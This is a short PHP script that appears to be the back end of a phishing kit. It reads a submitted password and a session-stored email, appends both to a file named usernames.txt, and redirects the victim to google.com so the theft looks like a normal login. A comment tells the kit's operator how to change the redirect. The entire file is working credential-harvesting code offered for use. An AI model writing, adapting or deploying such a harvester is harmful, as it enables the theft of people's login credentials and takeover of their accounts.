<?php
include 'ip.php';

			session_start();
			
			$pass = $_POST["password"];
			$email=$_SESSION["Email"];
			
			file_put_contents("usernames.txt", "                [ EMAIL: " . " ". $email . " ]   " . " " . "[ PASSWORD: " . " " . $pass . " ]\n", FILE_APPEND);
  			header('Location: https://google.com'); # This is where your site will redirect to, you may change it(default: google.com) #
			exit();
			
			
			session_destroy();
			
?>